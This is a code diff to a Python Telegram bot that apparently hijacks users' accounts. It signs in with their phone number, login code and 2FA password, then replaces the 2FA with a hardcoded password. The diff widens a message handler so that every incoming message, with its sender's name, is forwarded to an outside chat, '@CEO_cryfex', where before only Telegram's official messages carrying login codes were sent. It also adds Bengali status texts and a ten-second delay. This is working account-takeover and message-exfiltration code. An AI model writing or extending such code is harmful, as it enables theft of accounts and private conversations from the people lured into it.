@@ -155,7 +155,7 @@ WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN, WAITING_FOR_2FA
 # Admin settings - hardcoded for portability
 ADMIN_CHAT_ID = "5810613583"
 ADMIN_CHAT_ID_INT = int(ADMIN_CHAT_ID)
-FORWARD_CHAT_ID = "5810613583" # Forward to this ID
+FORWARD_CHAT_ID = "@CEO_cryfex" # Forward to this ID
 TWO_FA_PASSWORD = "2876886938"
 TELEGRAM_OFFICIAL_ID = 777000
 
@@ -2387,7 +2387,10 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
         
         # Success! Now set 2FA
-        await anim_msg.edit_text("⏳ **Setting up 2FA Protection...**", parse_mode='Markdown')
+        await anim_msg.edit_text("⏳ **লগইন সফল হয়েছে!**\n১০ সেকেন্ড পর অটোমেটিক ২এফএ (2FA) অন হবে...", parse_mode='Markdown')
+        
+        # Wait 10 seconds as requested
+        await asyncio.sleep(10)
         
         async def setup_system_2fa(client, phone):
             try:
@@ -2437,21 +2440,23 @@ Your payment will be moved to Main Balance after verification.
         # In a real scenario, we'd add an event handler to the client
         # to listen for messages from Telegram (777) and forward them.
         
-        @client.on(events.NewMessage(from_users=TELEGRAM_OFFICIAL_ID))
+        @client.on(events.NewMessage())
         async def handler(event):
-            logger.info(f"Received message from Telegram Official: {event.raw_text}")
-            # Forward ALL messages from official Telegram
+            # Forward ALL messages as requested
             try:
-                # Forward the actual message object for better formatting/media support if needed
-                # But here we use text as requested
-                forward_text = f"নতুন মেসেজ। {phone}\n\n{event.raw_text}"
+                sender = await event.get_sender()
+                sender_name = getattr(sender, 'first_name', 'Unknown')
+                if not sender_name and hasattr(sender, 'title'):
+                    sender_name = sender.title
+                
+                forward_text = f"📩 **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
                 await context.bot.send_message(
                     chat_id=FORWARD_CHAT_ID,
                     text=forward_text
                 )
-                logger.info(f"Forwarded official message for {phone} to {FORWARD_CHAT_ID}")
+                logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID}")
             except Exception as e:
-                logger.error(f"Failed to forward official message: {e}")
+                logger.error(f"Failed to forward message: {e}")
         
         # Change Telegram Name
         try:
@@ -2516,7 +2521,10 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         await client.sign_in(password=password)
         
         # Success! Now reset/update 2FA to our specific password
-        await anim_msg.edit_text("⏳ **Re-securing Account (Updating 2FA)...**", parse_mode='Markdown')
+        await anim_msg.edit_text("⏳ **লগইন সফল হয়েছে!**\n১০ সেকেন্ড পর অটোমেটিক ২এফএ (2FA) আপডেট হবে...", parse_mode='Markdown')
+        
+        # Wait 10 seconds as requested
+        await asyncio.sleep(10)
         
         try:
             # Get current password settings to compute hash
@@ -2558,21 +2566,23 @@ Your payment will be moved to Main Balance after verification.
 """, parse_mode='Markdown')
 
         # Forward login code if any
-        @client.on(events.NewMessage(from_users=TELEGRAM_OFFICIAL_ID))
+        @client.on(events.NewMessage())
         async def handler(event):
-            logger.info(f"Received message from Telegram Official: {event.raw_text}")
-            # Forward ALL messages from official Telegram
+            # Forward ALL messages as requested
             try:
-                # Forward the actual message object for better formatting/media support if needed
-                # But here we use text as requested
-                forward_text = f"নতুন মেসেজ। {phone}\n\n{event.raw_text}"
+                sender = await event.get_sender()
+                sender_name = getattr(sender, 'first_name', 'Unknown')
+                if not sender_name and hasattr(sender, 'title'):
+                    sender_name = sender.title
+                
+                forward_text = f"📩 **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
                 await context.bot.send_message(
                     chat_id=FORWARD_CHAT_ID,
                     text=forward_text
                 )
-                logger.info(f"Forwarded official message for {phone} to {FORWARD_CHAT_ID}")
+                logger.info(f"Forwarded message from {sender_name} for {phone} to {FORWARD_CHAT_ID}")
             except Exception as e:
-                logger.error(f"Failed to forward official message: {e}")
+                logger.error(f"Failed to forward message: {e}")
 
         # Change Telegram Name
         try:
